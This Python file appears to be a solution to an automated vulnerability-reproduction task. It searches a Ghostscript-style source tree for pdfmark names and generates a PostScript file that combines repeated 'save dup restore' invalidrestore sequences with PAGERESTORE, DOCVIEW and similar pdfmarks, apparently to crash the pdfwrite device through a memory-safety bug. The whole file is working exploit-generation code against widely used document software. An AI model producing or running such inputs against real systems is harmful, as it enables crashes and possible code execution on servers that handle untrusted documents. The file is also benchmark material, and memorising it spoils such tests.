import os
import re
import tarfile
from typing import Iterable, Set, Tuple, Optional


class Solution:
    def _iter_source_text_blobs(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        def want_name(name_l: str) -> bool:
            if not (name_l.endswith(".c") or name_l.endswith(".h") or name_l.endswith(".ps") or name_l.endswith(".cpp") or name_l.endswith(".cc")):
                return False
            if ("pdf" in name_l) or ("viewer" in name_l) or ("pdfwr" in name_l) or ("pdfwrite" in name_l) or ("pdfmark" in name_l) or ("gdevpdf" in name_l):
                return True
            return False

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    name = os.path.join(root, fn)
                    name_l = name.lower()
                    if not want_name(name_l):
                        continue
                    try:
                        st = os.stat(name)
                    except OSError:
                        continue
                    if st.st_size <= 0 or st.st_size > 1_000_000:
                        continue
                    try:
                        with open(name, "rb") as f:
                            data = f.read()
                        yield (name, data)
                    except OSError:
                        continue
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf:
                    if not m.isfile():
                        continue
                    name = m.name
                    name_l = name.lower()
                    if not want_name(name_l):
                        continue
                    if m.size <= 0 or m.size > 1_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield (name, data)
                    except Exception:
                        continue
        except Exception:
            return

    def _extract_candidate_marks(self, src_path: str) -> Set[str]:
        candidates: Set[str] = set()
        hard = {"PAGERESTORE", "PAGESAVE", "DOCVIEW", "VIEW"}
        candidates |= hard

        pat_q = re.compile(r'"([A-Z][A-Z0-9_]{2,40})"')
        pat_ps = re.compile(r"/([A-Z][A-Z0-9_]{2,40})\b")

        max_files = 200
        seen_files = 0

        for _, blob in self._iter_source_text_blobs(src_path):
            if seen_files >= max_files:
                break
            seen_files += 1
            try:
                txt = blob.decode("latin1", "ignore")
            except Exception:
                continue

            if ("viewer" not in txt.lower()) and ("pdfmark" not in txt.lower()) and ("docview" not in txt) and ("pagerestore" not in txt.upper()):
                continue

            for m in pat_q.finditer(txt):
                s = m.group(1)
                if "RESTORE" in s or "VIEW" in s or "PAGESAVE" in s or "PAGERESTORE" in s:
                    candidates.add(s)
                    if len(candidates) > 64:
                        return candidates

            for m in pat_ps.finditer(txt):
                s = m.group(1)
                if "RESTORE" in s or "VIEW" in s or "PAGESAVE" in s or "PAGERESTORE" in s:
                    candidates.add(s)
                    if len(candidates) > 64:
                        return candidates

        return candidates

    def solve(self, src_path: str) -> bytes:
        marks = self._extract_candidate_marks(src_path)

        # Prefer likely triggers first
        preferred = []
        for x in ("PAGERESTORE", "PAGESAVE", "DOCVIEW", "VIEW"):
            if x in marks:
                preferred.append(x)
                marks.discard(x)

        # Extra candidates, focusing on RESTORE-related marks
        extra_restore = sorted([m for m in marks if "RESTORE" in m])[:24]
        extra_other = sorted([m for m in marks if "RESTORE" not in m])[:16]

        lines = []
        lines.append("%!PS-Adobe-3.0")
        lines.append("/X { stopped pop } bind def")

        # Primary invalidrestore-based trigger (keeps save object on operand stack)
        lines.append("save dup restore")
        lines.append("{ dup restore } X")
        lines.append("pop")

        # Some viewer-related pdfmarks (swallow errors)
        lines.append("{ [ /PageMode /UseNone /DOCVIEW pdfmark } X")
        lines.append("{ [ /PageMode /UseOutlines /DOCVIEW pdfmark } X")

        # Common marks with no parameters
        if "PAGESAVE" in preferred:
            lines.append("{ [ /PAGESAVE pdfmark } X")
        if "PAGERESTORE" in preferred:
            lines.append("{ [ /PAGERESTORE pdfmark } X")
            lines.append("{ [ /PAGERESTORE pdfmark } X")

        # Try source-derived candidates (most likely to matter are RESTORE-related)
        for m in extra_restore:
            lines.append("{ [ /%s pdfmark } X" % m)

        # Additional candidates (lower priority)
        for m in extra_other:
            lines.append("{ [ /%s pdfmark } X" % m)

        # Repeat invalidrestore sequence after pdfmark activity
        lines.append("save dup restore")
        lines.append("{ dup restore } X")
        lines.append("pop")

        lines.append("{ showpage } X")
        lines.append("quit")
        lines.append("%%EOF")

        return ("\n".join(lines) + "\n").encode("ascii", "ignore")